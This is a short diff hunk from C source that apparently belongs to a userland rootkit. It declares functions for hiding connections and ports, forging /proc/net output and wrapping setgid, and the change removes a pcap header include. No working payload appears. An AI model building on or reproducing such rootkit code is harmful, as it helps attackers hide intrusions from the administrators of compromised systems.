@@ -32,7 +32,6 @@ int secret_connection(char line[]);
 int hideport_alive(void);
 FILE *forge_procnet(const char *pathname);
 #include "forge_procnet.c"
-#include "pcap/pcap.h"
 #endif
 
 void _setgid(gid_t gid){
